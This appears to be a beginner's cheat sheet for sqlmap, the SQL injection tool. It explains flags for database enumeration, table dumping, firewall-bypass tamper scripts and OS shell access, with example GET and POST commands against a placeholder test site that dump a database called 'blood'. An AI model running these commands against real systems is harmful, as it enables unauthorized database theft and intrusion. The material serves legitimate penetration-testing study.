# Sql map

# SQL Map

## Basic Commands :

> -u ⇒ this option used to put the  URL
> 

> --data ⇒ used if u have a POST request
> 

> --random-agent ⇒ Use randomly selected HTTP User-Agent header value
> 

> -p ⇒ if you want to test a parameter.
> 

> --level ⇒ Level of tests to perform (1-5, default 1)
> 

> --risk ⇒ Risk of tests to perform (1-3, default 1)
> 

> --r ⇒ To test on a request in a text file
> 

---

## Most Common Enumeration Tools :

> -all ⇒ if you want to retrieve everything from the database
> 

> --cookie "id=* You can specify a parameter in the cookies
> 

> --dbs ⇒ if you want to know the databases
> 

> --tables ⇒ if you want to know the tables
> 

> --columns ⇒ if you want to know the columns
> 

> --dump ⇒ Dump DBMS database table entries
> 

> --dump-all ⇒ Dump all DBMS databases tables entries
> 

> -D ⇒ to select a specific database from the enumeration process
> 

> -T ⇒ to select a specific table from the enumeration process
> 

> ---list-tampers ⇒ This will show you all tamper you can use to bypass the firewall
> 

> ---tamper ⇒ This will show you all tamper you can use to bypass the firewall
> 

---

## **Operating System** access commands :

> --os-shell ⇒ Prompt for an interactive operating system shell
> 

> --os-pwn ⇒ Prompt for an OOB shell, Meterpreter or VNC
> 

## Lets see a simple example using **GET** Method :

```bash
sqlmap -u <https://testsite.com/page.php?id=> --dbs
```

---

## Another Examples using **GET**

> 1-As you can see here we found a database called blood now we want to know the tables that includes in that database by using —tables
> 

```bash
sqlmap -u <https://testsite.com/page.php?id=7> -D blood --tables
```

> 2- We found a table called blood_db now we want to know the columns that includes in that table by using —columns
> 

```bash
sqlmap -u <https://testsite.com/page.php?id=7> -D blood -T blood_db --columns
```

> 3- you can also dumping the all database using this command
> 

```bash
sqlmap -u <https://testsite.com/page.php?id=7> -D <database_name> --dump-all
```

---

## Lets see a simple example using POST Method :

> As you can see here we used -r option to specify the file that contain our request and specify -p to make it to test on that parameter
> 

```bash
sqlmap -r req.txt -p blood_group --dbs

```

Another Examples using `POST`

> 1-As we can see here we know that we have a database called blood  now we want to know the tables and soo on like the GET method
> 

```bash
sqlmap -r req.txt -p blood_group -D blood --tables

```

> 2- also you can dumb the all data base in POST method using this command
> 

```bash
sqlmap -r req.txt -D <database_name> --dump-all

```